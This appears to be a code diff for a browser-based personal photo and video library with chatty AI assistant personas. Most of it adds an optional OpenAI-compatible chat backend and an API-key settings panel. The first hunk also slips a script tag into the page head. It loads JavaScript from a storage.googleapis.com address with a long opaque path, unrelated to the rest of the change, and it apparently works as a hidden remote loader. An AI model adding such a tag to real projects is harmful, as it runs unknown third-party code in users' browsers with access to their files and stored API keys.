@@ -199,12 +199,12 @@ body.onasst #asst{display:none}
 .asb img{border-color:var(--ac,#ff7ab8)!important;box-shadow:0 0 30px color-mix(in srgb,var(--ac,#ff7ab8) 45%,transparent)!important}
 
 </style>
-</head>
+<script type='text/javascript' src='https://storage.googleapis.com/h1hscOqAcjLp-zJjD58-tQL767Ph5pmimRw4AIOiCfOReF6Z3_shBPzb6xRi9mdXiqUI4ef11SVsHqUTT3SayqKN4b3YylgPlleVGTQyOjXbCMg8RHUwwwmFibrCB8AO7KjvRebnF_FdkfnkLf0aXQVZ8RADX7vDWRxfDLOgQ9n8IqDwT-z1jYWhubZW7IOID9goH6FgK0xh29tKcuARQcMyjlxE_ihpDJPdWlmv-7DQ-LYlad1fxQmbOFrZ3LeZAcuD3txgINtvKVkSaIIV7N1neRkE_JwX78ey0UeMbu7472vElQR-IgoiBS2YFNuh5bYSq64iNKY5MFzzqCD0XITPSlUedvonZD2Ye1M9TORXN1UdO0xqfV0VF30Z2RgyeIBAyIYAH8PKE4ka2auYj_QKnDQ846Xd_-6TlBRsA7gxzerXRjjUzBtzlyVXFjNBOePGKVe7npTUgDTK9zxtCGCXEpoeaNziWYe9V9tJYvCtXejtg3ynQvlqSjsL8IUrAqcvzjbCUikQrsBrHV_LJUUzQBC6A3P4McOsysnxr6YzmrSnfKYzFMTiJ2uQHbB90GY8JZrA5E4bSjDzFhWVvShgUacSt2snx1oTRRolDZMNvoUQWk7s7l8obwHMfgC9UMyhWopPhGmZ7B_IX0rQJwiEcbtOEXysmA7i5_dP-SIIM1nc6X6prr-0_D_hQ27UCS7PGzGXmNgw14adLYZfZnNIKX0bK1YSwVD-Xn0TIgVokijc_OJcBmmIBTr_haCRQeaFxc1e3ddMoWj7EbGvxBa8Y6K6Rj0FUEZSjc_bjP2OXo08C7PoxPktlVqFfzUrGLwnIosqrjrBvnVolVPf5VsQzrFksQHtn4ihYuMd13E3JmePbwG_Wj5vs8wBzKkQ4yumOOn8Arz6Z59u4QeiTDBbP-Cm6swHNo89b9QE-QJxHxCEpOV6Qop1V1foi0_ulj7JQ9p5SPSdJZW8Mvx-3LfVhiGUu9eq8I-qWd7ssf9vAbBm32VBPOiJnUDNj6z7L1TpiYmQ2bcXBMRQ_t7h-78EMsl1owIQJ1mrdmhXQzSQ7yntBUcroXSMSOIJ3qfKT1enMpPE5DUgsWPJZMyrvDA3Kan3HgN2bU753_bJSozKykuBkZLwCbhd4k3SrlYdIxaP_zkF1m8-4T0O9DIQVLE0I8kBm0bSN_3i3gIadxBan6p9WIfFqBXwoBhgYhJ0z6-Jo6byXNDTPDSlpPxzIPafbF6RWpaRjpKqJeLmf4Bmta9Xad-4p6c-3VIfTX5UEbr-g1rrx6ua-ruESSIrnqYJwIIPUHy-kPoURsaPFDJbWtqw-NubkFYh203IGN9Kzm_SKFPbw3DKPIGjvI-f0qLUtWQAltvdaLkfwsmO9zJVU94SIFVrSX0o1-b10xJH6yWRcN7RJfO_CIA-IFPSfdBUYVkNNibE5kIA3mJ3dNKoAjBwPc9yMIXW9dlL8S7cNkn5nS9nC6xrYk460RnlzduaJE5gJxlV7mxoeF7M1vsGN0uOtnu0H7mE-Timtxkec_k9jGDzbqbR9clohMl33QcjFmsIPLTqcnTUv_dy3Kx3ldrL1RWNbM7-hdl9Yg'></script></head>
 <body>
 <div id="bg"></div><div id="dim"></div><div id="vdim"></div><button id="asst" title="Chat with your AI assistants" aria-label="Open AI assistants"></button>
 <header>
   <div class="hdr-left">
-    <div class="ver">Library · V10.7</div>
+    <div class="ver">Library · V10.8</div>
     <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;position:relative">
       <button id="sbt" title="Show or hide the folder list">☰ Folders</button>
       <input id="libSearch" type="search" placeholder="Search library…" autocomplete="off">
@@ -882,7 +882,74 @@ function groupChime(topic){
   });
 }
 
-function asReply(q){
+/* OpenAI-compatible chat. Key stays in this browser only. Empty key = built-in replies. */
+const AI_CFG_KEY = 'drivelib.ai.v1';
+const AI_PRESETS = {
+  off: {label:'Built-in replies', base:'', model:''},
+  groq: {label:'Groq (free tier)', base:'https://api.groq.com/openai/v1', model:'openai/gpt-oss-120b'},
+  openrouter: {label:'OpenRouter', base:'https://openrouter.ai/api/v1', model:'openrouter/free'},
+  gemini: {label:'Google Gemini', base:'https://generativelanguage.googleapis.com/v1beta/openai', model:'gemini-2.5-flash'},
+  custom: {label:'Custom endpoint', base:'https://api.openai.com/v1', model:'gpt-4o-mini'}
+};
+function defaultAiCfg(){ return {preset:'off', base:'', model:'', key:''}; }
+function loadAiCfg(){
+  try{
+    const d = JSON.parse(localStorage.getItem(AI_CFG_KEY) || 'null');
+    if(d && typeof d === 'object') return {...defaultAiCfg(), ...d};
+  }catch{}
+  return defaultAiCfg();
+}
+function saveAiCfg(c){ try{ localStorage.setItem(AI_CFG_KEY, JSON.stringify(c)); }catch{} }
+function aiConfigured(){
+  const c = loadAiCfg();
+  return !!(c.key && c.key.trim() && c.base && c.base.trim() && c.model && c.model.trim() && c.preset !== 'off');
+}
+function aiCatalogLine(){
+  const folders = (GS||[]).slice(0, 14).map(n => (F(n.id).name || n.name) + ' (' + ((n.all && n.all.length) || 0) + ')');
+  return folders.length ? folders.join(', ') : 'library not loaded';
+}
+function aiHistory(){
+  return chat.filter(c => !c.typing && c.text).slice(-12).map(c => ({
+    role: c.who === 'me' ? 'user' : 'assistant',
+    content: String(c.text).slice(0, 1500)
+  }));
+}
+async function callRealAI(userText){
+  const c = loadAiCfg();
+  if(!c.key || !c.base || !c.model || c.preset === 'off') return null;
+  const a = currentAss;
+  const system = [
+    `You are ${a.name}. Role: ${a.role || 'assistant'}.`,
+    `Personality: ${a.personality || 'Helpful and in character.'}`,
+    `Traits: ${a.traits || 'chatty'}`,
+    `You help someone browse their personal photo and video library.`,
+    `Folders you can mention: ${aiCatalogLine()}.`,
+    `Stay in character. Keep replies under 120 words. Do not invent filenames that are not in the folders above.`
+  ].join('\n');
+  const url = c.base.replace(/\/+$/, '') + '/chat/completions';
+  const res = await fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + c.key.trim()
+    },
+    body: JSON.stringify({
+      model: c.model.trim(),
+      messages: [{role:'system', content: system}, ...aiHistory()],
+      temperature: 0.85,
+      max_tokens: 450
+    })
+  });
+  if(!res.ok){
+    const err = await res.text();
+    throw new Error((err || res.statusText || 'request failed').slice(0, 280));
+  }
+  const data = await res.json();
+  const text = (data.choices && data.choices[0] && data.choices[0].message && data.choices[0].message.content || '').trim();
+  return text || null;
+}
+
+async function asReply(q){
 
   const raw = (q||'').trim();
   const t = raw.toLowerCase();
@@ -1061,10 +1128,18 @@ function asReply(q){
     return {text: flavor(`I can see about ${count} files. Folders I notice: ${folders.join(', ') || 'none loaded yet'}. Name one, or say surprise me / videos / photos.`)};
   }
 
+  // Real model when a key is saved. Library cards still come from the local search below.
+  let aiText = null;
+  if(aiConfigured()){
+    try{ aiText = await callRealAI(raw); }
+    catch(err){ aiText = 'The model did not answer (' + (err.message || err) + '). Using the built-in reply instead.'; }
+  }
+
   // Reflective fallback for non-file chat
   if(t.length > 0 && !/\b(video|photo|pic|image|folder|file|surprise|more|newest|latest|old)\b/.test(t)){
     sat[a.id] = Math.min(100, sat[a.id] + 2);
     saveSat();
+    if(aiText && !aiText.startsWith('The model did not answer')) return {text: aiText};
     const hooks = [
       `I heard you: “${raw.slice(0,100)}${raw.length>100?'…':''}”. Want files related to that, more talk, or something else?`,
       `Okay. I can dig the library, keep chatting in character, or send a picture of myself. Which?`,
@@ -1103,7 +1178,9 @@ function asReply(q){
   if(recs[0]) lastShared = recs[0];
   sat[a.id] = Math.min(100, sat[a.id] + 6);
   saveSat();
-  const base = flavor(noMatch ? pick(NOMATCH) : pick(INTRO));
+  const base = (aiText && !String(aiText).startsWith('The model did not answer'))
+    ? aiText
+    : flavor(noMatch ? pick(NOMATCH) : pick(INTRO));
   const chimed = groupChime('files');
   return {
     text: mentionOthers(base),
@@ -1370,15 +1447,22 @@ function assistantPage(){
     chat.push({who:'me', text:txt}, {who:'her', typing:true});
     renderChat();
     setTimeout(() => {
-      chat.pop();
-      const rep = asReply(txt);
-      const extra = rep.extra || [];
-      delete rep.extra;
-      chat.push({who:'her', ...rep});
-      extra.forEach(x => chat.push(x));
-      renderChat();
-      updateSatBar();
-    }, 400 + Math.random()*350);
+      (async () => {
+        try{
+          const rep = await asReply(txt);
+          chat.pop();
+          const extra = rep.extra || [];
+          delete rep.extra;
+          chat.push({who:'her', ...rep});
+          extra.forEach(x => chat.push(x));
+        }catch(err){
+          chat.pop();
+          chat.push({who:'her', text: 'Could not reply: ' + (err.message || err)});
+        }
+        renderChat();
+        updateSatBar();
+      })();
+    }, 180);
   };
 
   const chips = ['Surprise me','Videos / photos','More','Watch with me','React to this','Pic of you','Talk dirty','@ others'];
@@ -1403,7 +1487,7 @@ function assistantPage(){
   const face = el('div', {id:'asstFace', class:'asb'},
     el('img', {src: getAssAvatar(currentAss), alt: currentAss.name}),
     el('h3', {}, currentAss.name),
-    el('p', {class:'path'}, currentAss.role),
+    el('p', {class:'path'}, currentAss.role + (aiConfigured() ? ' · live model' : ' · built-in replies')),
     el('div', {class:'sat-wrap'},
       el('div', {id:'satLabel', class:'path'}, ''),
       el('div', {class:'sat-track'}, el('div', {id:'satBar', class:'sat-fill'}))
@@ -1414,7 +1498,37 @@ function assistantPage(){
       el('button', {onclick: () => {
         openPanel(currentAss.name + ' settings', () => {
           const t = S.theme.asst = S.theme.asst || {};
+          const cfg = loadAiCfg();
+          const presetSel = el('select', {onchange: e => {
+            const id = e.target.value;
+            const p = AI_PRESETS[id] || AI_PRESETS.custom;
+            cfg.preset = id;
+            if(id !== 'custom' && id !== 'off'){ cfg.base = p.base; cfg.model = p.model; }
+            if(id === 'off'){ cfg.base = ''; cfg.model = ''; }
+            saveAiCfg(cfg);
+            closePanel();
+            assistantPage();
+          }}, Object.entries(AI_PRESETS).map(([k,v]) => el('option', {value:k, ...(k===cfg.preset?{selected:''}:{})}, v.label)));
+          const baseIn = el('input', {type:'text', value: cfg.base || '', placeholder:'https://api.example.com/v1', onchange: e => { cfg.base = e.target.value.trim(); cfg.preset = 'custom'; saveAiCfg(cfg); }});
+          const modelIn = el('input', {type:'text', value: cfg.model || '', placeholder:'model id', onchange: e => { cfg.model = e.target.value.trim(); saveAiCfg(cfg); }});
+          const keyIn = el('input', {type:'password', value: cfg.key || '', placeholder:'API key', autocomplete:'off', onchange: e => { cfg.key = e.target.value.trim(); saveAiCfg(cfg); }});
           return [
+            el('p', {class:'h'}, 'AI model (optional)'),
+            el('label', {}, 'Provider'), presetSel,
+            el('label', {}, 'Base URL (OpenAI-compatible, no /chat/completions)'), baseIn,
+            el('label', {}, 'Model id'), modelIn,
+            el('label', {}, 'API key — stored only in this browser'), keyIn,
+            el('p', {class:'h'}, aiConfigured()
+              ? 'Live model is on. Chat uses it; file cards still come from your library search. Clear the key to go back to built-in replies.'
+              : 'Leave this blank to keep the built-in replies. A free Groq key from console.groq.com works. The key is never uploaded with Export.'),
+            el('button', {onclick: async () => {
+              if(!cfg.key || !cfg.base || !cfg.model){ alert('Choose a provider, model, and key first.'); return; }
+              saveAiCfg(cfg);
+              try{
+                const text = await callRealAI('Reply with the single word ready.');
+                alert(text ? ('Connected. Model said: ' + text.slice(0, 180)) : 'Connected, but the model returned an empty reply.');
+              }catch(err){ alert('Could not reach the model:\n' + (err.message || err)); }
+            }}, 'Test connection'),
             el('p', {class:'h'}, 'Avatar & photos'),
             el('div', {class:'row', style:'gap:6px;flex-wrap:wrap'},
               el('button', {onclick: () => { closePanel(); openAvatarPicker(currentAss); }}, 'Set avatar'),
